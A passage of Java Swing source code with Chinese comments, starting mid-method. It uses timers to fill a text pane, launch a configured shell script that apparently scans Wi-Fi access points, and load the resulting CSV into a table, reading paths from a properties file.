	    	//scrollPane_APtable.setViewportView(getTable(csv_path));
	    	table = getTable(ScanAP_CSV_path);
			mk.setComponent(table);
			table.addKeyListener(mk);
	    	
	    	scrollPane_APtable.setViewportView(table);
	        timer.cancel();  
	      }
	    }, delay);// 设定指定的时间time,此处为2000毫秒	  
	}
	
	/*************************************************
	 * end
	 *************************************************/
	
	/*************************************************
	 * 计时器第二类  设定指定任务task在指定延迟delay后进行固定延迟peroid的执行
	 * @param <T>
	 *************************************************/
	  // schedule(TimerTask task, long delay, long period)
	  public <T> void timer2(long delay,final List<T> ss,final JTextPane jp) {
	    final Timer timer = new Timer();
	    
	   // List<String>  ss = new ArrayList<String>();
	    
	    timer.schedule(new TimerTask() {
	    	 int index=0;
	      public void run() {
	        //System.out.println("-------设定要指定任务--------");
	    	 
	    	  try {
		  			if(index<ss.size()){
		  				jp.getDocument().insertString(begin_text.getDocument().getLength(), "\n"+ss.get(index).toString(), new SimpleAttributeSet());	
		  			}
		  			else {
		  				
		  				//扫描3S后停止
		  				new Thread(new ShellThread(SHRLL_PATH)).start();
		  				
		  				new Thread(new CloseThread(10)).start();
		  				//4S读取输出文件
		  				timer1(new Timer(), 15000,SCAN_TIMES);

		  				/*table = getTable(ScanAP_CSV_path);

		  				mk.setComponent(table);
		  				table.addKeyListener(mk);
		  				scrollPane_APtable.setViewportView(table);*/
		  				SCAN_TIMES++;
		  				timer.cancel();
					}
		  			
		  		} catch (BadLocationException e) {
		  			e.printStackTrace();
		  		}
	    	  if(index<ss.size()){ 
	    		  index++;
	    	  }
	    	/* else {
				timer.cancel();
			}*/
	      }
	    }, 1000, delay);
	    
	    
	  }
	  
	  
	  
	  
	  /*************************************************
	 * 读取配置文件prameter.properties
	 *************************************************/
	  public void readProperties(){
		  	
			Properties prop = new Properties();
			InputStream in = Object. class .getResourceAsStream( "/prameter.properties" );    
	        try  {    
	           prop.load(in);    
	           ScanAP_CSV_path = prop.getProperty( "ScanAP_CSV_path" ).trim();    
	           SHRLL_PATH = prop.getProperty( "SHRLL_PATH" ).trim(); 
	           COUNTER_TYPE = Integer.parseInt(prop.getProperty( "COUNTER_TYPE" ).trim());
	       }  catch  (IOException e) {    
	           e.printStackTrace();    
	       }  
	         
	        
	        /*
	        File fileB = new File( this.getClass().getResource( "" ).getPath());  
	        
	        System. out .println( "fileB path: " + fileB);*/  
	  }
}
